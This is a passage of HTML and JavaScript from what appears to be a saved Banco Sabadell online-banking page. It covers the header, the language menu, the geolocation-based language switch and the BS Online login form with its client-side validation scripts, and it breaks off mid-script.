		<div id="ligthboxBack" style="display:none"></div>
		<div id="ligthboxContent" style="display:none">
			<div id="container">
					<span id="closePopup" onclick="closeUserSurvey($('input[name=tipo_operativa]').val(),$('input[name=id_usuario]').val(),1);"><img src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/cerrarProducto.png"></span>
					<iframe name="showSurvey" id="showSurvey" src="" width="600" height="590" scrolling="no" frameborder="0" class="optanon-category-C0004 "></iframe>
			</div>
		</div>
		
		
		
		
		

    <link media="all" type="text/css" rel="stylesheet" href="https://www.bancsabadell.com/StaticFiles/SabAtl/css/styles_blue_restyle.css?version=22.10"><link media="all" type="text/css" rel="stylesheet" href="https://www.bancsabadell.com/StaticFiles/SabAtl/css/site-styles_blue_restyle.css?version=22.10"><link media="all" type="text/css" rel="stylesheet" href="https://www.bancsabadell.com/StaticFiles/SabAtl/css/new-header-styles2.0.css?version=22.10"><link media="all" type="text/css" rel="stylesheet" href="https://www.bancsabadell.com/StaticFiles/SabAtl/css/styles-fonts.css?version=22.10"><link media="print" type="text/css" rel="stylesheet" href="https://www.bancsabadell.com/StaticFiles/SabAtl/css/new-header-print.css?version=22.10"><div class="hidden"><p><a accesskey="s" title="Ir directamente a los contenidos de la página" href="#content">Saltar navegación</a>
		
			</p></div><div id="fullelement" style="display: none"><div class="session-msg-container" id="fullelement2"><div class="warning-ico"><img class="warning-solid" alt="alerta" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/logoutlayer/warning-solid.png"></div><div class="msg-content"><div class="msg-info-title" id="title_banner">Por seguridad, hemos cerrado tu sesión</div><hr class="separator"><br><div class="msg-info" id="subtitle_banner">Puedes volver a acceder a tu banca online</div></div><div id="close-msg"><img class="close" alt="cerrar" id="closeimg" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/logoutlayer/close.png" onclick="myFunction()" role="button"></div></div><div class="no-banner" onclick="myFunction()" role="button"></div></div><div id="miscellaneousAncho"><div id="miscellaneous" class="liquid clear"><table id="utilities"><tbody><tr><td><a href="#" class="ftl" id="groupLink">Otras webs del grupo<span class="icon-bs-icon-abajo" id="iconCorp" style="color: #FFFFFF;padding-top: 3px; position: absolute; padding-left: 3px;"></span></a></td>
      <td><a id="homeO" class="ftl" href="/cs/Satellite/SabAtl/Oficinas/1191332199103/es/">Oficinas</a></td>
<script type="text/javascript">
	//<![CDATA[
	if(readCookie("username")){
		if(readCookie("segmento")!=null){
			var url;
			if(readCookie("segmento").indexOf("P") == 0){
				if(readCookie("BSOP_PP")!=null){
					if(readCookie("BSOP_PP").indexOf("BSO_URQ")!=-1){
						url = "/cs/Satellite/SabAtl/Banca-Privada/2000024744202/es/";
					}else{
						url = "/cs/Satellite/SabAtl/Particulares/1191332204474/es/";
					}
				}else{
					url = "/cs/Satellite/SabAtl/Particulares/1191332204474/es/";
				}	
			}else{
				url = "/cs/Satellite/SabAtl/Empresas/1191332202619/es/";
			}
			var td = '<td><a id="home" class="ftl" href="'+ url +'">Área comercial</a></td>';
			jQuery("#utilities tr:last").append(td);
		}
	}
	//]]>
</script>
</tr></tbody></table><table id="utilitiesR"><tbody><tr><td style="display: none;"><span id="lugarBusqueda" class="noVisible"></span><span id="paramBuscador" class="noVisible"><span><input type="hidden" name="pagename" value="GBS_contenedora"><input type="hidden" name="childpagename" value="SabAtl/GBS_distribuidora"><input type="hidden" name="cid" value="1191420029093"><input type="hidden" name="p" value="1191420029954"><input type="hidden" name="c" value="Page"><input type="hidden" name="resultado" value="si"><input type="hidden" name="_charset_" value="UTF-8"><input type="hidden" name="site" value="SabAtl"><input type="hidden" name="sitepfx" value="SA_"><input type="hidden" name="muestraBuscador" value="false"><input type="hidden" name="segmento" value="Particulares"><input type="hidden" name="packedargs" value="language=1178258082822"><input type="hidden" name="language" value="1178258082822"></span></span>

<td id="idiomasLink"><div id="titIdioma" class="noBackG">Bienvenidos<span id="iconLang" class="icon-bs-icon-abajo" style="color: #FFFFFF;padding-top: 3px; position: absolute; padding-left: 3px;"></span></div></td></tr></tbody></table><div id="languagesT" style="border-bottom: 8px solid #f4f4f5;border-right: 8px solid transparent;border-left: 8px solid transparent;width: 0px;height: 0px;display:none;position: absolute;top: 31px;margin-left: 967px;">
	</div>
	<ul id="languages" class="ftr noBackG" style="display:none"><script> 
								jQuery("#titIdioma").html('Bienvenidos<span id="iconLang" class="icon-bs-icon-abajo" style="color: #FFFFFF;padding-top: 3px; position: absolute; padding-left: 3px;"></span>');
							</script><li class="opcionGris">
										
										
									
										
										
									<div id="linkLang2"><a href="javascript:getLocation();" hreflang="ca">Benvinguts</a></div></li><li class="opcionBlanca">
										
										
									
										
										
									<div id="linkLang4"><a lang="eu" href="/cs/Satellite/SabAtl/BS-Online/1191332204053/eu/" hreflang="eu">Ongi etorri</a></div></li><li class="opcionGris">
										
										
									
										
										
									<div id="linkLang5"><a lang="gl" href="/cs/Satellite/SabAtl/BS-Online/1191332204053/gl/" hreflang="gl">Benvido</a></div></li><li class="opcionBlanca">
										
										
									
										
										
									<div id="linkLang6"><a href="/cs/Satellite/SabAtl/BS-Online/1191332204053/en/" hreflang="en">Welcome</a></div></li><li class="opcionGris">
										
										
									
										
										
									<div id="linkLang7"><a href="/cs/Satellite/SabAtl/BS-Online/1191332204053/fr/" hreflang="fr">Bienvenue</a></div></li><li class="opcionBlanca">
										
										
									
										
										
									<div id="linkLang8"><a href="/cs/Satellite/SabAtl/BS-Online/1191332204053/de/" hreflang="de">Willkommen</a></div></li></ul>
	
	<script>
			jQuery("#idiomasLink").click(function(y){
				if(!jQuery('#politicaCookies').is(":hidden") ){
					var alturaNotif = jQuery('#politicaCookies').outerHeight();
					var alturaBarra = jQuery('#miscellaneous').outerHeight();
					jQuery('#languages').css("top", alturaNotif + alturaBarra + 8);
					jQuery('#languagesT').css("top", alturaNotif + alturaBarra);
					y.stopPropagation();
					if (!jQuery('#menuUsuario').is( ":hidden" ) ) {
						jQuery('#menuUsuario').slideUp("slow");
						jQuery('#iconUser').attr( "src", "https://www.bancsabadell.com/StaticFiles/SabAtl/img/down.png");
					}
					if (!jQuery('#menuCorp').is( ":hidden" ) ) {
						jQuery('#menuCorp').slideUp("slow",function() {
							jQuery('#menuCorpT').slideUp(0);
							jQuery('#iconCorp').addClass("icon-bs-icon-abajo");
							jQuery('#iconCorp').removeClass("icon-bs-icon-arriba");
						});
					}
					if (!jQuery('#newMenuLogin').is( ":hidden" ) ) {
						jQuery("#newMenuLogin").css("display","none");
						jQuery("#flechaLogin").addClass("icon-bs-icon-abajo");
						jQuery("#flechaLogin").removeClass("icon-bs-icon-arriba");
					}
				}				
				if (jQuery('#languages').is( ":hidden" ) ) {
					jQuery('#languagesT').slideDown(0,function() {
						jQuery('#languages').slideDown("slow");
						jQuery('#iconLang').addClass("icon-bs-icon-arriba");
						jQuery('#iconLang').removeClass("icon-bs-icon-abajo")
					});
				} else {
					jQuery('#languages').slideUp("slow",function() {
						jQuery('#iconLang').addClass("icon-bs-icon-abajo");
        				jQuery('#iconLang').removeClass("icon-bs-icon-arriba");
        				jQuery('#languagesT').slideUp(0);
					});
					
				} 
			});
	</script>
	
	
	
	<script>
		//<![CDATA[
		function getLocation() {
			if(navigator.geolocation){
				if(typeof google === 'object'){
					if(typeof google.maps === 'object'){
						getLocationReady();
					}
				}else{
					var script = document.createElement('script');
					script.type = 'text/javascript';
					var ampersand = decodeURIComponent('%26');
					script.src = 'https://maps.googleapis.com/maps/api/js?v=3'+ampersand+'key=AIzaSyAQTt6T8pDdDQbC0TtoVt4HBhydUZTjh4I'+ampersand+'sensor=false'+ampersand+'language=ES'+ampersand+'callback=getLocationReady';
					document.body.appendChild(script);
				}
			}else{
				resolverIdioma('ca');
			}
		}
		function getLocationReady() {
				navigator.geolocation.getCurrentPosition(reverseGeo, errorLocation);
		}
		function errorLocation(error){
			if(window.console){
				console.log('geolocation bloqueada!');
			}
			resolverIdioma('ca');
		}
		function reverseGeo(position) {
			var pos = new google.maps.LatLng(position.coords.latitude,position.coords.longitude);
			var geo = new google.maps.Geocoder();
			geo.geocode({'location':pos}, function(results,status){
				if (status == google.maps.GeocoderStatus.OK) {
					if (results.length>0) {
						for(var i=0;results.length>i;i++){
							if(results[i].types[0] == 'administrative_area_level_1') {
								if(results[i].formatted_address.indexOf('Comunidad Valenciana') != -1) {
									resolverIdioma('va');
									return;
								}
							}
						}
					}else {
						if(window.console){
							console.log('reverseGeo: No results found');
						}
					}
				}else {
					if(window.console){
						console.log('reverseGeo: Geocoder failed due to: ' + status);
					}
				}
				resolverIdioma('ca');
			});
		}
		function resolverIdioma(idioma){
			idioma = idioma || 'ca';
			var rutaTx = '/null';
			if(rutaTx != '/null'){
				idioma = idioma=='va' ? 'VA' : 'CAT';
				var urlIdiomasNeti = ''+idioma;
				cambiaIdiomaTX(urlIdiomasNeti,idioma);
			}else{
				cambiaIdioma('/es/','/'+idioma+'/', 'SabAtl');
			}
		}
		function cambiaIdiomaTX(urlDestinoTX,idioma){
			var urlActual = document.location.href;
			var urlDestinoFinal = urlDestinoTX;
			if (urlActual.indexOf("LoginDNI.init.bs") != -1 || urlActual.indexOf("start.init.bs") != -1) {
				var i = urlActual.indexOf("?language=");
				if (i != -1) {
					var urlAux = urlActual.substring(0,i);
					var idiomaFinal = "es";
					switch(idioma) {
						case "CAS":
							idiomaFinal = "es";
							break;
						case "CAT":
							idiomaFinal = "CA-es";
							break;
						case "VA":
							idiomaFinal = "VA-es";
							break;
						case "EUS":
							idiomaFinal = "EU-es";
							break;
						case "GAL":
							idiomaFinal = "GL-es";
							break;
						case "ENG":
							idiomaFinal = "en";
							break;
						case "DEU":
							idiomaFinal = "de";
							break;
						case "FRA":
							idiomaFinal = "fr";
							break;
					}
					urlDestinoFinal = urlAux + "?language=" + idiomaFinal;
				}
			}
			var keyRandom = getKeyRandom();
			if (urlDestinoFinal.indexOf("?")!=-1) {
				urlDestinoFinal = urlDestinoFinal + "&key=" + keyRandom;
			} else {
				urlDestinoFinal = urlDestinoFinal + "?key=" + keyRandom;
			}
			window.location = urlDestinoFinal;
		}
		//]]>
	</script><div id="menuCorpT" style="margin-left: 151px;"></div><ul id="menuCorp" style="display: none; width: 198px;"><li class="opcionGris">
    <a href="https://www.bsmarkets.com/" target="Si">BSMarkets</a>
    </li><li class="opcionBlanca">
    <a href="https://www.grupbancsabadell.com" target="Si">Web del grupo</a>
    </li><li class="opcionGris">
    <a href="https://www.grupbancsabadell.com/fundacion" target="Si">Fundación Banco Sabadell</a>
    </li><li class="opcionBlanca">
    <a href="https://www.grupbancsabadell.com/fundacion" target="Si">Fundación Banco Sabadell</a>
    </li></ul></div></div><div id="headerAncho"><div id="header" class="liquid clear"><div id="headerPart1" class="ftl logoBSLeft" style=""><div class="espacio" id="espacio">
    <p id="logo" class="logo">
    <span class="logoImg"><a id="enlaceLogo" itemprop="url" href="/cs/Satellite/SabAtl/" title="Inicio"><img style="display:block" itemprop="logo" id="logoBSImgNewHeader" title="" alt="Logo Banco Sabadell" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/logo_bancsabadell.png"></a>

	
	<script type="text/javascript">
	var urlPage = document.location.href;
	if (urlPage.indexOf("InversorBP")>0) {
		if(document.getElementById("logoBSImgNewHeader")!=null && document.getElementById("logoURImgNewHeader")==null){
			jQuery('#logoBSImgNewHeader').remove();
			jQuery("span.logoImg a").append('<img style="margin-top:18px;" itemprop="logo" id="logoURImgNewHeader" title="" alt="Logo Sabadell Urquijo" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/logo_sabadellurquijo.png">');
		}
	}
	</script>
    </span></p></div></div><div id="headerPart2" class="ftr"><div id="newMenu">
    <table style="color: #fff;">
        <tbody><tr>
            
            <td id="elementoMenuUsuario">
                <img id="campana2" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/i_firmas.png">
            </td>
            <td id="elementoMenuUsuario">
                <div class="" id="menuUsuarioCabecera">
                    <div id="iconoNuevoUsuario" class="iconoNuevoUsuarioP" style="right: 149.5px;"><span>D</span></div>
                    <span id="nuevoNombreUsuario" style="font-size: 16px;"></span>
                    <span id="flechaUsuario" class="icon-bs-icon-abajo icon-bs-icon-arriba"></span>
                    <br>
                    <span id="nuevoSegmento"></span>
                </div>          
            </td>
            <td id="newDesca">
                <span id="tooltipNew" onclick="Salir()" class="icon-bs-icon-cerrar"></span>
                <span id="tooltipsNew" class="tooltips">Cerrar sesión</span>
                <script type="text/javascript">
                    //<![CDATA[
                    jQuery("#newDesca").mouseover(function(){
                        if (isAppleDevice()) {
                            Salir();
                        } else {
                            jQuery("#tooltipsNew").css("display","block");
                        }
                    });
                    jQuery("#newDesca").mouseout(function(){
                        jQuery("#tooltipsNew").css("display","none");
                    });
                    
                    function isAppleDevice(){
                        return (
                            (navigator.userAgent.toLowerCase().indexOf("ipad") > -1) ||
                            (navigator.userAgent.toLowerCase().indexOf("iphone") > -1) ||
                            (navigator.userAgent.toLowerCase().indexOf("ipod") > -1)
                        );
                    }
                    //]]>               
                </script>
            </td>
        </tr>
    </tbody></table>
</div>



<div id="newLogin" style="visibility: visible;">
    <span id="candadoLogin" class="icon-bs-icon-bloquear"></span><span id="textLogin">Accede a <span id="textBSOLogin" style="font-weight: bold;">BS Online</span></span><span id="flechaLogin" class="icon-bs-icon-abajo"></span>
</div>
<div id="newMenuLogin" style="margin-left: 48px; display: none;">
        <div style="width: 200px;height: 30px;color: #000000;padding-top: 30px; padding-left: 30px;">
                <span style="font-size: 14px;font-weight: bold;">BS Online</span><br><span style="font-size: 12px;">Acceso a tus cuentas</span>
        </div>
        
        <form name="myFormNew" method="post" onsubmit="javascript:myFormNewSubmit(event)" action="/txbs/LoginDNISCA.doLogin.bs" autocomplete="off" class="" style="border-bottom:none;">
            
            <div id="capaSCAMod" style="display:none;"></div>
            
            <input type="hidden" name="pin">
            <input type="hidden" name="language" maxlength="3" size="15" value="CAS">
            <input type="hidden" id="signTextId" name="signText" value="">
            <input type="hidden" id="msgLoginId" name="msgLogin" value="PERTaWduYXR1cmVDbGllbnQtT3BlcmF0aW9uPkdlbmVyaWNTaWduPC9EU2lnbmF0dXJlQ2xpZW50
            LU9wZXJhdGlvbj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iRGF0YSI+MTE5MjYw
Njc2NTY3MDwvRFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVDbGllbnQtUGFy
YW1ldGVyIG5hbWU9IlNpZ25hdHVyZVR5cGUiPlN0YW5kYXJkPC9EU2lnbmF0dXJlQ2xpZW50LVBh
cmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iUHJvdmlkZXIiPjwvRFNp
Z25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyIG5hbWU9
IkFwcGxpY2F0aW9uIj5CUzwvRFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVD
bGllbnQtUGFyYW1ldGVyIG5hbWU9Ik5vQ2VydGlmaWNhdGVzVVJMIj4vdHhicy9zdGFydC5pbml0
LmJzPC9EU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0
ZXIgbmFtZT0iSWRpb21hSUQiPjE8L0RTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyPjxEU2lnbmF0
dXJlQ2xpZW50LVBhcmFtZXRlciBuYW1lPSJJZ25vcmVUb2tlbiI+ZmFsc2U8L0RTaWduYXR1cmVD
bGllbnQtUGFyYW1ldGVyPjxEU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlciBuYW1lPSJJbWFnZUdy
YWRpZW50ZSI+L2czcmVwb3NpdG9yeS9HRU4vTE9HT19CU19MT0dPQlMuR0lGPC9EU2lnbmF0dXJl
Q2xpZW50LVBhcmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iTG9nb1By
b3ZpZGVyVVJMIj4vZzNyZXBvc2l0b3J5L0dFTi9MT0dPX0JTX0xPR09CUy5HSUY8L0RTaWduYXR1
cmVDbGllbnQtUGFyYW1ldGVyPg==">
            <input type="hidden" id="signLoginId" name="signLogin" value="MIID/AYJKoZIhvcNAQcCoIID7TCCA+kCAQExCzAJBgUrDgMCGgUAMAsGCSqGSIb3DQEHAaCCAtIw
ggLOMIICN6ADAgECAhA1vxLflU/sDO6wvIXk+791MA0GCSqGSIb3DQEBBQUAMDoxEzARBgNVBAoT
CmUteHRlbmRub3cxIzAhBgNVBAMTGmUteHRlbmRub3cgQ2xhc3MgMyBDQSB0ZXN0MB4XDTAzMTEy
NzAwMDAwMFoXDTA0MTEyNjIzNTk1OVowfjETMBEGA1UEChQKZS14dGVuZG5vdzEfMB0GA1UECxQW
Rm9yIFRlc3QgUHVycG9zZXMgT25seTETMBEGA1UEAxMKZXh0ZW5kIGdmcDEPMA0GA1UEKhMGZXh0
ZW5kMQwwCgYDVQQEEwNnZnAxEjAQBgNVBAUTCTExMTExMTExSDCBnzANBgkqhkiG9w0BAQEFAAOB
jQAwgYkCgYEA0+gGQVMeNHv7u8Zz8Xly+5+80FwZhX6p9osupPKmoYCr+IB1U03s4LDVZznkR98z
icKJqt3U8evssm6toUhpwfd1dAeOq+UmrKa3Mz3e5WW2FK5rw30sDMpjZSxHDK66z2czJrYVijID
PqfFYUuicUDzcUPNC+JLxJG7q3VUCysCAwEAAaOBkDCBjTALBgNVHQ8EBAMCBaAwCQYDVR0TBAIw
ADBNBgNVHR8ERjBEMEKgQKA+hjxodHRwOi8vcGlsb3RvbnNpdGVjcmwuYWNlLmVzL2V4dGVuZG5v
d0lUQ2xhc3MzL0xhdGVzdENSTC5jcmwwEQYJYIZIAYb4QgEBBAQDAgeAMBEGCmCGSAGG+EUBBgkE
AwEB/zANBgkqhkiG9w0BAQUFAAOBgQBtFWcEumky5yVG9fjrAtpwjWTLGkrOd1zTzc03SvUokJcJ
z9LQvH6iZ0K6Mo1AdX60hJnXskbKWEw93ItvgKsBxf6nUp2CIdj/XOk4KQvzZfrb/9JLtcA2Sfcw
MGeSN+K3DbuNy51kf+LSMK1AwDCEU9OfhOycRkZ0ApEDz9YGFzGB8zCB8AIBATBOMDoxEzARBgNV
BAoTCmUteHRlbmRub3cxIzAhBgNVBAMTGmUteHRlbmRub3cgQ2xhc3MgMyBDQSB0ZXN0AhA1vxLf
lU/sDO6wvIXk+791MAkGBSsOAwIaBQAwDQYJKoZIhvcNAQEBBQAEgYBGY+dR0v+W4LVoVNqJgUgD
uVoX8tNW1wOQOUXi4iVHzcZ+vU7kOZv4gS8W5EJuHQT3U7O/bnhuHL7BputnausEXfsJcqcBJEzS
1RZqpdJFRGHs-wgB20lbvnfOyvb814xq6m9y8tUFwFMhm++VRowAlfHwzxiGvKZP5XH9E6GKOnQ==">
            <script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/AC_OETags.js" type="text/javascript"></script><script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/hashtable.js" type="text/javascript"></script><script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/rsa.js" type="text/javascript"></script><input type="hidden" name="evision.userLang" value=""><script>
            //<![CDATA[
                document.myFormNew.elements["evision.userLang"].value = detectLanguage();
                //]]>
            </script><input type="hidden" name="evision.RSADeviceFso" id="evision.RSADeviceFso" value="">
            <script language="javascript">
            //<![CDATA[
                if(typeof getJSESSIONID_JBSWL == 'function'){
                    document.write("<INPUT TYPE='hidden' name='evision.csid' value='"+ getJSESSIONID_JBSWL() +"'/>");
                }
                //]]>
            </script><input type="hidden" name="evision.csid" value="FNv_wmui4A3Xbo-vdNPLmiNS1666443263916">
            
                <script language="javascript">
                //<![CDATA[
                    document.write("<INPUT TYPE='hidden' name='evision.deviceTokenCookie' value='"+ getCookie('DeviceTokenCookie') +"'/>");
                //]]>
                </script><input type="hidden" name="evision.deviceTokenCookie" value="196.65.172.137.1666443265715">
            <script language="javascript">
            //<![CDATA[
                document.write("<INPUT TYPE='hidden' name='evision.RSADevicePrint' value='" + urlEncode(add_deviceprint()) +"'/>");
            //]]>
            </script><input type="hidden" name="evision.RSADevicePrint" value="version%3D3%2E5%2E1%5F4%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F106%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1920%7C1080%7C1040%26pm%5Ffpsw%3D%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1920%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D106%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D"><script language="JavaScript" type="text/javascript">
            //<![CDATA[
                if(!(typeof ipCliente == "string")) {
                    ipClienteAux = "";
                } else {
                    ipClienteAux = ipCliente;
                }
            //]]>
            </script>
            <div style="width: 200px;height: 14px;font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; color: #000000;padding-top: 30px; padding-left: 30px;">Usuario (DNI)
            </div>
            <div style="padding-left: 30px;padding-top: 10px;">
                <input id="user" style="padding-left: 10px;width: 190px;height: 34px;background-color: #ffffff;border: solid 1px #000000;" maxlength="12" size="11" name="userDNI" tabindex="1" type="text">
            </div>
            <div style="width: 200px;height: 14px;font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; color: #000000;padding-top: 15px; padding-left: 30px;">Contraseña
            </div>
            <div style="padding-left: 30px;padding-top: 10px;">
                <input id="pinPassword" style="padding-left: 10px;width: 190px;height: 34px;background-color: #ffffff;border: solid 1px #000000;" maxlength="12" size="11" name="pinDNI" tabindex="1" onkeypress="validateKeyNew(event)" type="password">
            </div>
            <div id="errorNewLogin" style="padding-top:10px;padding-left: 30px; width: 207px; font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; text-align: left; color: #be0028; display: none;">
            </div>
            <div style="padding-top:10px;padding-left: 30px; width: 207px; height: 14px; font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; text-align: left; color: #be0028; display: none;">
                <a style="text-decoration: none; width: 200px; height: 14px; font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; text-align: left; color: #006dff !important;" href="">¿Tienes problemas para acceder?</a>
            </div>
            <div style="width: 200px; height: 40px; background-color: #006dff;margin-top: 16px;margin-left: 30px;">
                <input id="button1" name="accept" value="Entrar" onclick="return validateNew()" tabindex="3" type="button">
            </div>
        </form><div id="forgottenpinusermenu"><a href="javascript:forgottenpin()">¿No puedes acceder?</a>
                <script type="text/javascript" language="JavaScript">
                    function forgottenpin() {
                        var csid = getJSESSIONID_JBSWL();
                        var url = '/txbs/SVForgottenPinNew.init.bs?locale=CAS' + "&csid=" + csid;
                        window.location = url;
                    }
                </script></div>
        <div style="padding-top:14px;padding-left: 30px; width: 207px; height: 14px; font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; text-align: left; color: #be0028;">
            <a style="text-decoration: none; width: 200px; height: 14px; font-family: Arial; font-size: 12px; font-weight: normal; font-style: normal; font-stretch: normal; text-align: left; color: #006dff !important;" href="/cs/Satellite/SabAtl/BSOnline/1191332204053/es/">Otros accesos</a>
        </div>
        <div class="cajaEnlaces alturaEnlaces">
            <table class="tablaEnlaces">
                <tbody>
                    <tr>
                        <td class="tdHagaseCliente tdAnchuraHC1">
                            <div class="">
                                <a href="/cs/Satellite/SabAtl/Hagase-Cliente/2000019036617/es/" target="_blank" id="enlaceHC">
                                    <span class="icon-bs-icon-usuario spanIconoHagaseClientePart spanIconoHC1"></span>
                                    <span class="spanTextoHagaseCliente spanTextoHC1Part">Hágase cliente</span>
                                </a>
                            </div>
                        </td>
                        <td class="tdCitaPrevia">
                            <div>
                                <a href="/cita-previa/landing/index-es.html" target="_blank" id="enlaceCP">
                                    <span class="icon-bs-icon-calendario spanIconoCitaPreviaPart"></span>
                                    <span class="spanTextCitaPreviaPart">Servicio de cita previa</span>
                                </a>                            
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        <script type="text/javascript">
            //<![CDATA[
            jQuery("#newLogin").click(function(){
                if(jQuery("#newMenuLogin").is(":hidden")){
                    //controlar altura como en el idioma
                    if(jQuery('#politicaCookies').html()!=null && !jQuery('#politicaCookies').is(":hidden") ){
                        //96 es el top normal y 64 es el ancho de la barra de las cookies
                        if(!logout){
                            jQuery('#newMenuLogin').css("top", 96 + 64);
                        }
                    }
                    jQuery("#newMenuLogin").css("display","block");
                    jQuery("#flechaLogin").addClass("icon-bs-icon-arriba");
                    jQuery("#flechaLogin").removeClass("icon-bs-icon-abajo");
                }else{
                    jQuery("#newMenuLogin").css("display","none");
                    jQuery("#flechaLogin").addClass("icon-bs-icon-abajo");
                    jQuery("#flechaLogin").removeClass("icon-bs-icon-arriba");
                }
            });
            //]]>
        </script>
        
        <script type="text/javascript" language="JavaScript">
            //<![CDATA[
            var formnameFW = "myFormNew";
            function validateKeyNew(evt)  {
                if (evt.keyCode == 13 ||evt.which == '13') validateNew();
            }
            function validateNew() {
                var flag = 0;
                var pwP = /[^A-Z0-9]/gi;
                var usrP = /[^A-Z0-9\/]/gi;
                var usuari = document.myFormNew.userDNI.value;
                var pass = document.myFormNew.pinDNI.value;
                var formatDNIError = '¡Ups! Hay un error en el formato del DNI o de la clave de acceso.';
                var altura = jQuery("#errorNewLogin").height();
        
                if ((usuari == "")||(typeof(usuari) == "undefined")||(usrP.test(usuari))) flag = 1;
                if ((pass == "")||(typeof(pass) == "undefined")||(pwP.test(pass))) flag = 2;
        
                if (flag != 0) {
                    if(jQuery('#errorNewLogin').is(":hidden")){
                        jQuery("#errorNewLogin").text(formatDNIError);
                        jQuery(".spanTextoHC1").css("top",jQuery("#errorNewLogin").height() + parseInt(jQuery(".spanTextoHC1").css("top"))+10);
                        jQuery(".spanIconoHC1").css("top",jQuery("#errorNewLogin").height() + parseInt(jQuery(".spanIconoHC1").css("top"))+10);
                        jQuery(".spanIconoCitaPrevia").css("top",jQuery("#errorNewLogin").height() + parseInt(jQuery(".spanIconoCitaPrevia").css("top"))+10);
                        jQuery(".spanTextCitaPrevia").css("top",jQuery("#errorNewLogin").height() + parseInt(jQuery(".spanTextCitaPrevia").css("top"))+10);
                        jQuery("#errorNewLogin").show();
                    }
                    jQuery("#user").css("border-color","#be0028");
                    jQuery("#pinPassword").css("border-color","#be0028");
                }else{
                    if(jQuery('#errorNewLogin').is(":visible")){
                        jQuery(".spanTextoHC1").css("top",parseInt(jQuery(".spanTextoHC1").css("top")) - jQuery("#errorNewLogin").height() - 10);
                        jQuery(".spanIconoHC1").css("top",parseInt(jQuery(".spanIconoHC1").css("top")) - jQuery("#errorNewLogin").height() - 10);
                        jQuery(".spanIconoCitaPrevia").css("top",parseInt(jQuery(".spanIconoCitaPrevia").css("top")) - jQuery("#errorNewLogin").height() - 10);
                        jQuery(".spanTextCitaPrevia").css("top",parseInt(jQuery(".spanTextCitaPrevia").css("top")) - jQuery("#errorNewLogin").height() - 10);
                        jQuery("#errorNewLogin").hide();                    
                    }
                    jQuery("#user").css("border-color","black");
                    jQuery("#pinPassword").css("border-color","black");
                    document.myFormNew.button1.disabled = true;
                    setLoginCookie("1");
                    document.myFormNew.pin.value = pass;
                    document.myFormNew.pinDNI.value = "";
                    validateDeviceTokenCookie();
                    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
                    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
                    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
                    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
                    callDoLoginMod('myFormNew');
                }
            }
            //]]>
        </script>
        <script type="text/javascript" language="JavaScript">
            //<![CDATA[
            function doAction2New(id) {
                for (j = 0; j < document.forms.length; j++)
                    for (i = 0; i < document.forms[j].elements.length; i++)
                        if (document.forms[j].elements[i].type == "button" )
                                document.forms[j].elements[i].disabled=true;
                                
              document.myFormNew.submit();
            }
            function setLoginCookie(div){       
                var cookieAceptacionCookies_SabAtl = getCookie("aceptacionCookies_SabAtl");
                var cookieAceptacionCookies_BSAndorra = getCookie("aceptacionCookies_BSAndorra");
                
